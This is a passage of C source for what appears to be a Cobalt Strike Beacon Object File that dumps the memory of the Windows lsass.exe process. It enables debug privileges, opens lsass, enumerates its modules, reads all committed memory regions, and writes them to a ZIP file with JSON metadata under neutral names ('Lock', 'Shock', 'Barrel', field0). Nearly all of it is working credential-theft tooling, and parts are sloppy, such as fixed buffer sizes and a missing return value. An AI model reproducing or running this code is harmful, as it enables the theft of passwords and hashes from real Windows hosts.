        }
    }
    return moduleInformationList[0]; // Change to empty module
}


int find_index_by_name(ModuleInformation* moduleInformationList, int module_counter, const char* aux_name) {
    for (int i = 0; i < module_counter; i++) {
        if (MyStrCmp(moduleInformationList[i].base_dll_name, aux_name) == 0) {
            return i;
        }
    }
    return -1;
}


char* concatenate_strings(char* str1, char* str2) {
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t len1 = MyStrLen(str1);
    size_t len2 = MyStrLen(str2);
    size_t all_len = len1 + len2 + 1;
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, all_len);
    if (result == NULL) {
        return NULL;
    }
    for (size_t i = 0; i < len1; i++) {
        result[i] = str1[i];
    }
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = str2[i];
    }
    result[len1 + len2] = '\0';
    return result;
}


char* create_string_with_var(char* f1, char* var1, char* f2) {
    size_t f1_len = MyStrLen(f1);
    size_t v1_len = MyStrLen(var1);
    size_t f2_len = MyStrLen(f2);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    size_t total_len = f1_len + v1_len + f2_len + 1;  // +1 for null terminator
    char* result = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);    
    if (result == NULL) {
        return NULL;
    }
    size_t offset = 0;
    for (size_t i = 0; i < f1_len; i++) {
        result[offset++] = f1[i];
    }
    for (size_t i = 0; i < v1_len; i++) {
        result[offset++] = var1[i];
    }
    for (size_t i = 0; i < f2_len; i++) {
        result[offset++] = f2[i];
    }
    result[offset] = '\0';
    return result;
}


void replace_backslash(const char* str, char* result, int result_size){
    int i, j = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (j + 2 >= result_size) {
            BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
            break;
        }
        if (str[i] == '\\') {
            result[j++] = '\\';
            result[j++] = '\\';
        } 
        else {
            if (j + 1 >= result_size) {
                BeaconPrintf(CALLBACK_ERROR, "Result buffer size is too small.");
                break;
            }
            result[j++] = str[i];
        }
    }
    result[j] = '\0';
}


void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
    // CreateFile
    HANDLE hFile = KERNEL32$CreateFileA(
        file_path,                // File path
        GENERIC_WRITE,            // Open for writing
        0,                        // Do not share
        NULL,                     // Default security
        CREATE_ALWAYS,            // Overwrite the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
        NULL                      // No template file
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
        return;
    }

    // WriteFile
    DWORD bytesWritten;
    BOOL result = KERNEL32$WriteFile(
        hFile,                    // Handle to the file
        data,                     // Pointer to the data to write
        data_len,                 // Length of the data (in bytes)
        &bytesWritten,            // Number of bytes written
        NULL                      // Overlapped not used
    );
    if (!result) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
    } else {
        if(debug){
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
        }
    }

    // Close handle
    KERNEL32$CloseHandle(hFile);
}


char* get_json_barrel(MemFile* memfile_list, int memfile_count){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }
    char* json_output = "[";
    for (int i = 0; i < memfile_count; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        char* base_buffer[17];
        MyIntToHexStr((long long) memfile_list[i].address, base_buffer);
        char* size_buffer[12];
        MyIntToStr(memfile_list[i].size, size_buffer);
        char* buffer_name[17];
        MyIntToHexStr((long long) memfile_list[i].address, buffer_name);
        char* json_part_1 = create_string_with_var("{\"field0\":\"", buffer_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"0x", base_buffer, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"", size_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    return json_output;
}


void free_concatenated_string(char* str) {
    if (str != NULL) {
        HANDLE hHeap = KERNEL32$GetProcessHeap();
        if (hHeap != NULL) {
            KERNEL32$HeapFree(hHeap, 0, str);
        }
    }
}


short getDosTime() {
    return (12 << 11) | (0 << 5) | (0 / 2);  // Example: 12:00:00 (noon)
}


short getDosDate() {
    return (2024 - 1980) << 9 | (9 << 5) | 28;  // Example: September 28, 2024
}


int crc32(const char* data, size_t length) {
    unsigned int crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (unsigned char)data[i];
        for (int j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    int result = ~crc;
    return result;
}


// Function to create a ZIP file
void create_zip(const char* zip_fname, ZipFile* zip_files, int file_count) {
    HANDLE hZipFile;
    DWORD writtenBytes = 0;

    // Open or create the ZIP file using CreateFile
    hZipFile = KERNEL32$CreateFileA(zip_fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hZipFile == INVALID_HANDLE_VALUE) {
        // printf("Failed to open zip file.\n");
        return;
    }

    int centralDirSize = 0;
    int centralDirOffset = 0;
    long centralDirStart = 0;

    // Allocate memory for the central directory headers
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    struct CentralDirectoryHeader* centralHeaders = (struct CentralDirectoryHeader*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, file_count * sizeof(struct CentralDirectoryHeader));
    if (centralHeaders == NULL) {
        KERNEL32$CloseHandle(hZipFile);
        return;
    }

    // Process each file in the zip_files array
    for (int i = 0; i < file_count; i++) {
        const char* filename = zip_files[i].filename;
        const char* fileContent = zip_files[i].content;
        size_t fileSize = zip_files[i].size;

        // Initialize the local file header
        struct LocalFileHeader localHeader;
        localHeader.signature = 0x04034b50;
        localHeader.version = 20;  // Version needed to extract (2.0)
        localHeader.flag = 0;
        localHeader.compression = 0;  // No compression
        localHeader.modTime = getDosTime();  // Define getDosTime() and getDosDate() to return time values
        localHeader.modDate = getDosDate();
        localHeader.crc32 = crc32(fileContent, fileSize);  // Define crc32() function to calculate CRC
        localHeader.compressedSize = fileSize;
        localHeader.uncompressedSize = fileSize;
        localHeader.filenameLength = MyStrLen(filename);
        localHeader.extraFieldLength = 0;

        // Capture the local file header offset
        DWORD localFileOffset = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);

        // Write local file header
        KERNEL32$WriteFile(hZipFile, &localHeader, sizeof(localHeader), &writtenBytes, NULL);
        KERNEL32$WriteFile(hZipFile, filename, MyStrLen(filename), &writtenBytes, NULL);
        KERNEL32$WriteFile(hZipFile, fileContent, fileSize, &writtenBytes, NULL);

        // Prepare the central directory header for this file
        struct CentralDirectoryHeader centralHeader;
        centralHeader.signature = 0x02014b50;
        centralHeader.versionMadeBy = 20;
        centralHeader.versionNeeded = 20;
        centralHeader.flag = 0;
        centralHeader.compression = 0;
        centralHeader.modTime = localHeader.modTime;
        centralHeader.modDate = localHeader.modDate;
        centralHeader.crc32 = localHeader.crc32;
        centralHeader.compressedSize = localHeader.compressedSize;
        centralHeader.uncompressedSize = localHeader.uncompressedSize;
        centralHeader.filenameLength = localHeader.filenameLength;
        centralHeader.extraFieldLength = 0;
        centralHeader.commentLength = 0;
        centralHeader.diskNumberStart = 0;
        centralHeader.internalFileAttr = 0;
        centralHeader.externalFileAttr = 0;
        centralHeader.relativeOffset = localFileOffset;

        // Store the central directory header
        centralHeaders[i] = centralHeader;
        centralDirSize += sizeof(centralHeader) + MyStrLen(filename);
    }

    // Capture the central directory start offset
    centralDirStart = KERNEL32$SetFilePointer(hZipFile, 0, NULL, FILE_CURRENT);

    // Write the central directory headers for all files
    for (int i = 0; i < file_count; i++) {
        KERNEL32$WriteFile(hZipFile, &centralHeaders[i], sizeof(centralHeaders[i]), &writtenBytes, NULL);
        KERNEL32$WriteFile(hZipFile, zip_files[i].filename, MyStrLen(zip_files[i].filename), &writtenBytes, NULL);
    }

    // Initialize the end of central directory record
    struct EndOfCentralDirectory eocd;
    eocd.signature = 0x06054b50;
    eocd.diskNumber = 0;
    eocd.centralDirDisk = 0;
    eocd.numEntriesOnDisk = file_count;
    eocd.totalEntries = file_count;
    eocd.centralDirSize = centralDirSize;
    eocd.centralDirOffset = centralDirStart;
    eocd.commentLength = 0;

    // Write end of central directory record
    KERNEL32$WriteFile(hZipFile, &eocd, sizeof(eocd), &writtenBytes, NULL);

    // Clean up
    KERNEL32$HeapFree(hHeap, 0, centralHeaders);
    KERNEL32$CloseHandle(hZipFile);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated.\n", zip_fname);
}


ZipFile createZipFile(const char* fname, unsigned char* fcontent, int size) {
    ZipFile zip_file;
    int fname_len = MyStrLen((char*)fname);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    zip_file.filename = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fname_len + 1);  // +1 for null terminator
    zip_file.content = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);  // Allocate exact size for content
    MyStrcpy(zip_file.filename, fname, fname_len + 1);  // Ensure max_len includes null terminator
    MyMemcpy(zip_file.content, fcontent, size);  // No need for MyStrcpy, as we're copying raw bytes
    zip_file.size = (size_t) size;
    return zip_file;
}


void dump_files(MemFile* memfile_list, int memfile_count, char* zip_name){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    ZipFile* zip_files = (ZipFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(ZipFile) * memfile_count);
    if (!zip_files) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for zip_files.");
        return;
    }
    for (int i = 0; i < memfile_count; i++) {
        zip_files[i] = createZipFile(memfile_list[i].filename, memfile_list[i].content, memfile_list[i].size);
    }

    // Create a ZIP file with one element
    create_zip(zip_name, zip_files, memfile_count);
}


void Barrel(char* filename, HANDLE hProcess, char* zip_name){
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";
     int memfile_count = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();  
    MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);

    while ((long long)mem_address < proc_max_address_l) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            SIZE_T regionSize = mbi.RegionSize;
            PVOID buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
            SIZE_T bytesRead = 0;     // Number of bytes actually read
            NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buffer, regionSize, &bytesRead);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
                BeaconPrintf(CALLBACK_OUTPUT, "NtReadVirtualMemory failed with status: 0x%p\n", ntstatus);
            }

            // Add to MemFile array
            MemFile memFile;
            char* buffer_name[17];
            MyIntToHexStr((long long) mem_address, buffer_name);
            MyStrcpy(memFile.filename, buffer_name, 17);
            memFile.content = (unsigned char*) buffer;
            memFile.size = mbi.RegionSize;
            memFile.address = mem_address;
            memfile_list[memfile_count++] = memFile;
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }
    
    // Create JSON
    char* json_output = get_json_barrel(memfile_list, memfile_count);
    int data_len = MyStrLen(json_output);
    write_string_to_file(filename, json_output, data_len, TRUE);

    // Create dump files
    dump_files(memfile_list, memfile_count, zip_name);
}


char* get_json_shock(ModuleInformation* module_list, int module_counter){
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
        return;
    }

    char* json_output = "[";
    for (int i = 0; i < module_counter; i++) {
        if(i != 0){
            json_output = concatenate_strings(json_output, ", ");    
        }
        char* base_buffer[17];
        MyIntToHexStr((long long) module_list[i].dll_base, base_buffer);
        char* size_buffer[12];
        MyIntToStr(module_list[i].size, size_buffer);
        char* full_dll_path_corrected[MAX_PATH];
        replace_backslash(module_list[i].full_dll_path, full_dll_path_corrected, MAX_PATH);
        
        char* json_part_1 = create_string_with_var("{ \"field0\":\"", module_list[i].base_dll_name, "\",");
        char* json_part_2 = create_string_with_var("\"field1\":\"", full_dll_path_corrected, "\",");
        char* json_part_3 = create_string_with_var("\"field2\":\"0x", base_buffer, "\",");
        char* json_part_4 = create_string_with_var("\"field3\":\"", size_buffer, "\"}");
        char* json_part_a = concatenate_strings(json_part_1, json_part_2);
        char* json_part_b = concatenate_strings(json_part_3, json_part_4);
        char* json_entry = concatenate_strings(json_part_a, json_part_b);
        json_output = concatenate_strings(json_output, json_entry);
    }
    json_output = concatenate_strings(json_output, "]");
    KERNEL32$HeapFree(hHeap, 0, buffer);
    return json_output;
}

    
void Shock(char* filename, HANDLE* hProcessOutput){
    EnableDebugPrivileges();
    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
    *hProcessOutput = hProcess;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
    int module_counter = 0;
    ModuleInformation* module_list = CustomGetModuleHandle(hProcess, &module_counter);    
    long long proc_max_address_l = 0x7FFFFFFEFFFF;
    PVOID mem_address = 0;
    int aux_size = 0;
    char aux_name[MAX_PATH] = "";

    while ((long long)mem_address < proc_max_address_l) {
        // Populate MEMORY_BASIC_INFORMATION struct
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T returnSize;
        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);

        // If readable and committed --> Get information
        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
            // Find the module by name
            ModuleInformation aux_module = find_module_by_name(module_list, module_counter, aux_name);

            if (mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.dll_base) {
                aux_module.size = aux_size;
                // Find module index
                int aux_index = find_index_by_name(module_list, module_counter, aux_name);
                // BeaconPrintf(CALLBACK_OUTPUT, "[+] aux_index: \t\t%d\n", aux_index);
                if (aux_index >= 0 && aux_index < module_counter){
                    module_list[aux_index] = aux_module;
                }

                for (int k = 0; k < module_counter; k++) {
                    if (mbi.BaseAddress == module_list[k].dll_base) {                        
                        MyStrcpy(aux_name, module_list[k].base_dll_name, MAX_PATH);
                        aux_size = (int)mbi.RegionSize;
                    }
                }
            }
            else {
                aux_size += (int)mbi.RegionSize;
            }
        }
        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
    }

    char* json_output = get_json_shock(module_list, module_counter);
    int json_output_len = MyStrLen(json_output);
    write_string_to_file(filename, json_output, json_output_len, TRUE);
}


void Lock(char* filename){
    OSVERSIONINFOW osvi;
    NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
    if (status == 0) {
        char* majorversion_buffer[12];
        MyIntToStr(osvi.dwMajorVersion, majorversion_buffer);
        char* minorversion_buffer[12];
        MyIntToStr(osvi.dwMinorVersion, minorversion_buffer);
        char* buildnumber_buffer[12];
        MyIntToStr(osvi.dwBuildNumber, buildnumber_buffer);
        char* json_part_1 = create_string_with_var("{ \"field0\": \"", majorversion_buffer, "\", ");
        char* json_part_2 = create_string_with_var("\"field1\": \"", minorversion_buffer, "\", ");        
        char* json_part_3 = create_string_with_var("\"field2\": \"", buildnumber_buffer, "\"}");
        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
        char* json_output = concatenate_strings(concatenate_strings("[", json_entry), "]");
        int json_output_len = MyStrLen(json_output);
        write_string_to_file(filename, json_output, json_output_len, TRUE);
    }
}


void go(char *args, int length) {
    // Get first argument value
    //      - disk:        09000000050000006469736b00
    //      - knowndlls:   0e0000000a0000006b6e6f776e646c6c7300
    //      - debugproc:   0e0000000a000000646562756770726f6300    
    datap  parser;
    char * option;
    BeaconDataParse(&parser, args, length);
    option = BeaconDataExtract(&parser, NULL);
    if (option){
        ReplaceLibrary(option);
    }

    // Filenames
    char* filename_lock   = "lock.json";
    char* filename_shock  = "shock.json";
    char* filename_barrel = "barrel.json";
    char* zip_name = "barrel.zip";    
    HANDLE hProcess;

    // Create folder with random name (or you can set a fixed folder name)
    // char* barrel_folder_name[10];
    // generate_random_string(barrel_folder_name, 10);
    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
    // KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);

    Lock(filename_lock);
    Shock(filename_shock, &hProcess);
    Barrel(filename_barrel, hProcess, zip_name);
}